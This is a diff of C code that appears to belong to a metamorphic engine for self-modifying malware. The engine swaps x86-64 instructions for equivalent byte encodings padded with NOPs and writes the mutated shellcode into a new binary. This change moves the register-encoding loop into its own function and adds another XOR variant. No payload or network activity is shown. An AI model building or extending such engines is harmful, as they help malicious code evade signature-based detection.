@@ -648,19 +648,6 @@ static int8_t getRandomNbr(int8_t max) {
 /*   "\x31\xff\xeb\x01\x90\x42", // xor edi, edi\n\t jmp 2 */
 /*   "\x31\xff\x90\xeb\x00\x42", // xor edi, edi\n\t nop\n\t jmp 1 */
 /*   "\x42", */
-/*   "\x48\xc7\xc3\x00\x00\x00\x00\x42", // mov rbx, 0x0 */
-/*   "\x48\x31\xdb\x90\x90\x90\x90\x42", // xor rbx ,rbx */
-/*   "\x90\x90\x48\x31\xdb\x90\x90\x42", // xor rbx ,rbx */
-/*   "\x42", */
-/*   "\x48\xc7\xc1\x00\x00\x00\x00\x42", // mov rcx, 0x0 */
-/*   "\x48\x31\xc9\x90\x90\x90\x90\x42", // xor rcx ,rcx */
-/*   "\x90\x90\x48\x31\xc9\x90\x90\x42", // xor rcx ,rcx */
-/*   "\x42", */
-/*   "\x48\xc7\xc2\x00\x00\x00\x00\x42", // mov rdx, 0x0 */
-/*   "\x48\x31\xd2\x90\x90\x90\x90\x42", // xor rdx ,rdx */
-/*   "\x90\x90\x48\x31\xd2\x90\x90\x42", // xor rdx ,rdx */
-/*   "\x42", */
-/*   "\x48\xc7\xc6\x00\x00\x00\x00\x42", // mov rsi, 0x0 */
 /*   "\x48\x31\xf6\x90\x90\x90\x90\x42", // xor rsi ,rsi */
 /*   "\x90\x90\x48\x31\xf6\x90\x90\x42", // xor rsi ,rsi */
 /*   "\x42", */
@@ -668,6 +655,37 @@ static int8_t getRandomNbr(int8_t max) {
 /*   "\x31\xff\x40\xb7\x01\x42", // xor edi, edi\n\t mov dil, 0x1 */
 /*   "\x42", */
 /* }; */
+
+static void updateRegisters(unsigned char *ins, unsigned char *pointer, unsigned char *shellcode, unsigned char *bin, size_t *binSize) {
+  size_t  i;
+
+  i = 0;
+  while (*ins != 0x42) {
+    if (*ins == 0) {
+      ins += 1;
+      *binSize += 1;
+      continue ;
+    }
+    i = 0;
+    while (pointer[i] != 0x42) {
+      if (((*ins & 0x1) == 0x1 && (pointer[i] & 0x1) == 0x1) ||
+          (*ins & 0x4) == 0x4 && (pointer[i] & 0x4) == 0x4)
+        bin[*binSize] |= (shellcode[i] & 0x7);
+      if ((*ins & 0x1) == 0x1 && (pointer[i] & 0x8) == 0x8 ||
+          (*ins & 0x4) == 0x4 && (pointer[i] & 0x20) == 0x20)
+        bin[*binSize] |= ((shellcode[i] >> 3) & 0x7);
+      if ((*ins & 0x8) == 0x8 && (pointer[i] & 0x1) == 0x1 ||
+          (*ins & 0x20) == 0x20 && (pointer[i] & 0x4) == 0x4)
+        bin[*binSize] |= ((shellcode[i] << 3) & 0x38);
+      if ((*ins & 0x8) == 0x8 && (pointer[i] & 0x8) == 0x8 ||
+          (*ins & 0x20) == 0x20 && (pointer[i] & 0x20) == 0x20)
+        bin[*binSize] |= (shellcode[i] & 0x38);
+      i += 1;
+    }
+    *binSize += 1;
+    ins += 1;
+  }
+}
 
 /* Source operand = 0b00000001 - Destination operand = 0b00000100 */
 const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = {
@@ -678,7 +696,8 @@ const char  instructions[][MAX_INS_SIZE] __attribute__ ((section (".text#"))) = 
   /* "\xb8\x41\x00\x00\x00\x42", */
   /* "\x42", */
   "\x48\xc7\xc0\x00\x00\x00\x00\x42\x00\x00\x21\x00\x00\x00\x00\x42", // MOV r64, 0x0
-  "\x48\x31\xc0\x90\x90\x90\x90\x42\x00\x00\x9\x00\x00\x00\x00\x42", // XOR r64, r64
+  "\x48\x31\xc0\x90\x90\x90\x90\x42\x00\x00\x09\x00\x00\x00\x00\x42", // XOR r64, r64
+  "\x90\x90\x48\x31\xc0\x90\x90\x42\x00\x00\x00\x00\x09\x00\x00\x42", // XOR r64, r64
   "\x42"
 };
 
@@ -708,6 +727,7 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
           ins += MAX_INS_SIZE;
         continue ;
       }
+      i += j;
       pointer = ins;
       while (ins[0] != 0x42 && ins != (void *)copyModifiedCode - sizeof(instructions))
         ins -= MAX_INS_SIZE;
@@ -730,32 +750,7 @@ static void  copyModifiedCode(struct bfile *new, size_t binSize, size_t size) {
       binSize -= k;
       k += 1;
       pointer += k;
-      while (ins[k] != 0x42) {
-        if (ins[k] == 0) {
-          k += 1;
-          binSize += 1;
-          continue ;
-        }
-        j = 0;
-        while (pointer[j] != 0x42) {
-          if (((ins[k] & 0x1) == 0x1 && (pointer[j] & 0x1) == 0x1) ||
-              (ins[k] & 0x4) == 0x4 && (pointer[j] & 0x4) == 0x4)
-            bin[binSize] |= (shellcode[i + j] & 0x7);
-          if ((ins[k] & 0x1) == 0x1 && (pointer[j] & 0x8) == 0x8 ||
-              (ins[k] & 0x4) == 0x4 && (pointer[j] & 0x20) == 0x20)
-            bin[binSize] |= ((shellcode[i + j] >> 3) & 0x7);
-          if ((ins[k] & 0x8) == 0x8 && (pointer[j] & 0x1) == 0x1 ||
-              (ins[k] & 0x20) == 0x20 && (pointer[j] & 0x4) == 0x4)
-            bin[binSize] |= ((shellcode[i + j] << 3) & 0x38);
-          if ((ins[k] & 0x8) == 0x8 && (pointer[j] & 0x8) == 0x8 ||
-              (ins[k] & 0x20) == 0x20 && (pointer[j] & 0x20) == 0x20)
-            bin[binSize] |= (shellcode[i + j] & 0x38);
-          j += 1;
-        }
-        binSize += 1;
-        k += 1;
-      }
-      i += j;
+      updateRegisters(ins + k, pointer, shellcode + i, bin, &binSize);
       while (ins[0] != 0x42)
         ins += MAX_INS_SIZE;
       ins += MAX_INS_SIZE;
